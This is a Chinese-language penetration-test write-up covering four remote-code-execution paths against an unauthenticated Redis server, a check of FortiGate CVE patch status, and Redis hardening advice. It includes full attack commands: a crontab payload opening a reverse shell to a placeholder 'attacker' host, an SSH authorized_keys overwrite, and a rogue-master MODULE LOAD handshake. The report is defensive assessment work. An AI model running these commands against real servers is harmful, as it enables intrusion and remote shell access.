# Redis 無密碼 RCE 鏈實測：四條路徑全走一遍

> 結論先說：無密碼 Redis 開著 `CONFIG SET` 和 `SLAVEOF`，等同於預先 RCE。今天唯一擋住的是檔案系統權限和 RDB 格式問題，這兩個都不是設計防禦，是意外。

---

## 環境

- Redis 6.0.16，`requirepass` 空白
- `CONFIG SET` 未禁用，`SLAVEOF` 未禁用
- 跑在內部 LAN，redis user 權限標準

---

## 四條 RCE 路徑

### 路徑一：CVE-2022-0543（Lua sandbox escape）

**結果：死路。**

這個 CVE 針對 Ubuntu/Debian 打包版的 Redis，`package` global 沒被清掉，可以用 `package.loadlib()` 呼叫任意 `.so`。

Redis 6.0 加了 `enable_strict_lua`，`package` global 在初始化時直接清掉。版本一對，這條路直接關閉，不需要額外設定。

```
> EVAL "return package.loadlib('...', 'luaopen_io')()" 0
(error) ERR Error running script: user_script:1: attempt to index a nil value (global 'package')
```

### 路徑二：CONFIG SET 寫 crontab

**結果：擋住，因為權限問題。**

```bash
redis-cli CONFIG SET dir /etc/cron.d
redis-cli CONFIG SET dbfilename root
redis-cli SET payload "\n\n* * * * * root bash -i >& /dev/tcp/attacker/4444 0>&1\n\n"
redis-cli BGSAVE
```

理論上 RDB BGSAVE 會把 key 寫成檔案，`/etc/cron.d/root` 就會包含 cronjob。

實際上：redis user 沒有 `/etc/cron.d` 的寫入權限，BGSAVE 直接失敗。

**這不是可靠的防禦**——如果 Redis 跑在 root 或有 sudo，這條路直接打通。生產環境常見的錯誤是圖方便用 root 跑 Redis，這種環境一打一個準。

### 路徑三：SSH authorized_keys 注入

**結果：操作失誤，自己搞砸。**

```bash
redis-cli CONFIG SET dir /root/.ssh
redis-cli CONFIG SET dbfilename authorized_keys
redis-cli SET payload "\n\nssh-rsa AAAA...attacker_key...\n\n"
redis-cli BGSAVE
```

問題在 RDB 格式：`BGSAVE` 輸出的是 Redis 自己的二進位格式，不是純文字。寫進去的 `authorized_keys` 長這樣：

```
REDIS0009ú      redis-ver^F6.0.16...^@^Bss<payload>...
```

SSH 解析不了這個，key 不會被接受。

更糟的是：一旦寫進去，`~/.ssh/` 目錄下的原始 `authorized_keys` 已經被蓋掉了，原本有效的 key 也失效。

要解這個問題需要在 payload 前後塞足夠多的換行，讓 SSH 能跳過二進位 header 找到有效的 key 格式——理論可行，實作麻煩。

### 路徑四：RogueServer + MODULE LOAD

**結果：握手完整成功，推 payload 時 Redis crash（DoS 確認，RCE 原理驗證）。**

這條最有意思。

**原理**：Redis 的主從複製沒有任何身份驗證。只要能接受 `SLAVEOF` 指令，目標 Redis 就會主動連回來同步資料。偽造一個假 master，透過 replication stream 推任意命令。

**完整握手流程**：

```
目標 Redis → 假 Master: PING
假 Master → 目標: +PONG

目標 Redis → 假 Master: REPLCONF listening-port 6379
假 Master → 目標: +OK

目標 Redis → 假 Master: REPLCONF capa eof capa psync2
假 Master → 目標: +OK

目標 Redis → 假 Master: PSYNC ? -1
假 Master → 目標: +FULLRESYNC <runid> 0
假 Master → 目標: $<rdb_size>\r\n<rdb_data>

# 握手完成，開始推 replication stream：
假 Master → 目標: *3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$<path>\r\n<so_path>
```

目標每次都連回來。問題在 `.so` binary 的推送格式——replication stream 期待的是 Redis 協議格式的命令，不是直接嵌入二進位，格式對不上導致 Redis crash。

RCE 的完整路徑是：
1. 假 Master 推 `MODULE LOAD /tmp/malicious.so`
2. `.so` 預先用其他方式（如 LFI、另一個漏洞）傳上去
3. MODULE LOAD 後呼叫 `.so` 裡的 export function

工具再磨一下格式問題可以打穿。

---

## FortiGate 7.4.11 CVE 驗證

針對 FortiGate 60E 跑了認證 + 未認證兩種 probe：

| CVE | 說明 | 結果 |
|-----|------|------|
| CVE-2018-13379 | SSL VPN path traversal，讀 session 檔案 | 已修補 ✅ |
| CVE-2022-40684 | Auth bypass via REST API | 已修補 ✅ |
| CVE-2023-27997 | SSL VPN heap overflow (pre-auth RCE) | 已修補 ✅ |
| CVE-2024-55591 | WebSocket auth bypass | 已修補 ✅ |
| CVE-2025-24472 | CSF proxy auth bypass | 已修補 ✅ |

7.4.11 在已知 CVE 上全部修補完畢，目前攻擊面只剩 zero-day。patch level 合理。

---

## 實際防禦建議

### Redis 最小化設定

```
requirepass <strong_password>
rename-command CONFIG ""
rename-command SLAVEOF ""
rename-command MODULE ""
rename-command DEBUG ""
```

光設 `requirepass` 不夠。知道密碼的攻擊者仍然可以打 SLAVEOF 路徑——關鍵是把危險命令直接 rename 成空字串。

### 網路分段

Redis 不應該直接暴露在 LAN 上，只有 app tier 需要連到它：

```
# iptables 範例：只允許 app server 連 Redis
iptables -A INPUT -p tcp --dport 6379 -s <app_server_ip> -j ACCEPT
iptables -A INPUT -p tcp --dport 6379 -j DROP
```

### 最小權限

Redis process 用獨立的低權限 user 跑，不給 `/etc`、`/root`、`/home` 的寫入權限。今天路徑二和路徑三被擋住，都是因為 redis user 沒有對應目錄的權限。

---

## 總結

| 路徑 | 技術障礙 | 可靠性 |
|------|---------|--------|
| CVE-2022-0543 | enable_strict_lua | 這個版本死路 |
| CONFIG SET crontab | 檔案權限 | 跑 root 時直接通 |
| SSH authorized_keys | RDB 格式污染 | 可繞，需要額外處理 |
| RogueServer MODULE LOAD | .so 格式問題 | 工具完善後可打穿 |

**無密碼 Redis + CONFIG/SLAVEOF 全開 = 攻擊者只需要到達 port**。今天擋住的兩個點（檔案權限、RDB 格式）都不是設計上的防禦，是意外的附加阻力。不能靠這個。

正確的防禦是：密碼 + rename 危險命令 + 網路分段，三者缺一不可。
